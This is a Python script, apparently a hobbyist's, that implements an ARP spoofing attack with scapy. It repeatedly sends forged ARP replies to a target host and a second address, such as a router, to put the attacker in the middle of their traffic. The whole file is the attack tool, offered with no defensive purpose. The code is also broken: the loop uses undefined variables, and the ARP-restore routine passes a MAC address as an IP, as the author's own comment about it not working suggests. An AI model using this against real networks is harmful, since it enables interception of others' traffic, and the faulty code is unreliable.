# ARP SPOOFER
import scapy.all as scapy
import time
import argparse

def args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', dest='tip', help='IP TO TARGET THE ATTACK')
    parser.add_argument('-s','-spoof', dest='sip', help='IP TO SPOOF')
    (val) =  parser.parse_args()
    if not val.tip or not val.sip:
        parser.error('INVALID ARGS, USE --help')
    return val

def gmac(ip):
    arpreq = scapy.ARP(pdst=ip)
    bcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arpreqbcast = bcast/arpreq
    anslst = scapy.srp(arpreqbcast, timeout=1, verbose=False)[0]
    
    return anslst[0][1].hwsrc

def spoof(tip, sip): #target ip | target mac | router ip
    tmac = gmac(tip)
    pacc = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=sip)
    scapy.send(pacc, verbose=False)

def rest(dstip, srcip):
    dstmac = gmac(dstip)
    srcip = gmac(srcip)
    pacc = scapy.ARP(op=2, pdst=dstip, hwdst=dstmac, psrc=srcip)
    scapy.send(pacc, count=4, verbose=False)

#tip = '10.0.2.4' #ADD ARGS 
#sip = '10.0.2.1'

val = args()

try:
    pacccnt = 0
    while True:
        spoof(tip, sip)
        spoof(sip, tip)
        pacccnt += 2
        print(f'\rPACKETS SENT: {str(pacccnt)}', end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nRESETTING ARP...")
    rest(tip, sip)
    rest(sip, tip) # IDK WHY THIS DOESNT WORK BUT I WILL FIX SOON 
